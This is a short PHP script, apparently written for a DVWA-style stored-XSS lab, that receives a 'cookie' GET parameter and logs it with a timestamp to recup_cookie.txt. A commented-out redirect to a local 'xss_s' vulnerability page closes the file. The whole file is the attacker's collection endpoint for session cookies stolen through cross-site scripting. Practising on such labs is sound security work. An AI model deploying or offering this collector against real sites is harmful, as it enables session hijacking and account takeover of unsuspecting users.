<?php

if(sizeof($_GET) > 0) {
    if(!empty($_GET['cookie']) && is_string($_GET['cookie'])) {
            file_put_contents('recup_cookie.txt',
                    date('d/m/Y H:i:s').' - session : '.$_GET['cookie']."\n",
                    FILE_APPEND
            );
           
         
    }
}

   // header('location: http://localhost:81/vulnerabilities/xss_s/');

